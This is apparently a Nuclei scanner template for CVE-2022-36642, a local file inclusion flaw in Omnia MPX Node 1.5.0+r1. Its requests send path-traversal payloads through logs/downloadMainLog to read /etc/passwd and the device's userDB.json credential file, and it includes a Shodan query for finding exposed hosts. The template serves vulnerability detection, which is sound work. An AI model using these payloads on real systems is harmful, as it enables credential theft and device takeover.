id: CVE-2022-36642
info:
  name: Omnia MPX 1.5.0+r1 - Local File Inclusion
  author: arafatansari,ritikchaddha,For3stCo1d
  severity: critical
  description: CVE-2022-36642 is a vulnerability in Omnia MPX 1.5.0+r1 that allows
    an attacker to retrieve cleartext credentials and escalate privileges via the
    control panel by exploiting local file inclusion through logs/downloadMainLog.
  reference:
  - https://www.exploit-db.com/exploits/50996
  - https://cyber-guy.gitbook.io/cyber-guy/pocs/omnia-node-mpx-auth-bypass-via-lfd
  - https://nvd.nist.gov/vuln/detail/CVE-2022-36642
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-36642
    cwe-id: CWE-862
  metadata:
    shodan-query: http.title:"Omnia MPX Node | Login"
    verified: 'true'
    impact: The impact of CVE-2022-36642 in Omnia MPX 1.5.0+r1 is the potential for
      cleartext credentials to be retrieved and privileges escalated via the control
      panel, due to the vulnerability of local file inclusion through logs/downloadMainLog.
    recommendation: It is recommended that users upgrade their Telos Alliance Omnia
      MPX Node to a version beyond 1.5.0+r1 to avoid the vulnerability related to
      local file inclusion via logs/downloadMainLog, which can lead to the retrieval
      of cleartext credentials and privilege escalation via the control panel.
  tags: traversal,omnia,edb,cve,cve2022,lfi
requests:
- method: GET
  path:
  - '{{BaseURL}}/logs/downloadMainLog?fname=../../../../../../..//etc/passwd'
  - '{{BaseURL}}/logs/downloadMainLog?fname=../../../../../../..///config/MPXnode/www/appConfig/userDB.json'
  stop-at-first-match: true
  matchers-condition: or
  matchers:
  - type: regex
    regex:
    - root:[x*]:0:0
  - type: word
    part: body
    words:
    - '"username":'
    - '"password":'
    - '"mustChangePwd":'
    - '"roleUser":'
    condition: and
